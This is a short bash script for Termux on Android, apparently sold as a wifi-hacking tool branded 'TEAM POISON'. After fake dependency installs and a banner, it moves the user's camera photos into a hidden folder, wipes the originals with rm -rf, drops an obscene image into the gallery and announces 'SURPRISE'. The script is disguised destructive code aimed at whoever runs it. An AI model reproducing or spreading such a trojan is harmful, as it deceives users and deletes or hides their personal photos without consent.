#!/bin/bash

clear

green="\e[92m"
printf "${green}"

echo "INSTALLING REQUIRMENTS" | lolcat
sleep 1
pkg install ruby
gem install pip
pip install --upgrade pip
pip install mkdir

clear

green="\e[92m"
printf "${green}"

toilet -f smblock "TEAM POISON" 
echo
echo
echo "CODED BY GHO57_X" | lolcat

sleep 3
clear

cd $HOME/HackWifi
mkdir b
cp -r /storage/emulated/0/DCIM/Camera $HOME/HackWifi/b
rm -rf /storage/emulated/0/DCIM/Camera
cd /storage/emulated/0/DCIM
mkdir Camera
cp $HOME/HackWifi/p/fuck.jpg /storage/emulated/0/DCIM/Camera

echo "Poiii Settayyyy" | lolcat
sleep 3
clear
echo "SURPRISE" | lolcat
sleep 2
clear
echo "PLEASE CHECK YOUR GALLERY" | lolcat
exit
done

